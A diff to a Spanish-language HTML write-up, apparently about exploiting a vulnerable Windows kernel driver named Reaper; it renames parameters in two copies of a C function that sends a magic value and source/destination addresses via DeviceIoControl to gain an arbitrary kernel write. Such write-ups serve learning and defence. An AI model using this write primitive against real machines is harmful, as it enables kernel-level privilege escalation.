@@ -1051,14 +1051,14 @@ PS C:\driver></span>
 
 <p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los ultimos valores son la dirección de fuente y de destino, entonces llamamos a la función <code class="language-plaintext highlighter-rouge">Alloc</code> para establecer la estructura, luego a <code class="language-plaintext highlighter-rouge">Copy</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando a la función <code class="language-plaintext highlighter-rouge">Free</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> src</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> dest</span><span class="p">) {  
+<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {  
     ReaperData userData;
 
     userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
     userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
     userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
-    userData.SrcAddress </span><span class="o">= </span><span class="p">src;
-    userData.DstAddress </span><span class="o">=</span><span class="p"> dest;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">what;
+    userData.DstAddress </span><span class="o">=</span><span class="p"> where;
 
     Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
     Copy(hDevice);
@@ -1303,14 +1303,14 @@ PROCESS ffffba09b847a040
     DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);
 }
 
-</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> src</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> dest</span><span class="p">) {
+</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> where</span><span class="p">) {
     ReaperData userData;
 
     userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
     userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
     userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
-    userData.SrcAddress </span><span class="o">= </span><span class="p">src;
-    userData.DstAddress </span><span class="o">=</span><span class="p"> dest;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">what;
+    userData.DstAddress </span><span class="o">=</span><span class="p"> where;
 
     Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
     Copy(hDevice);
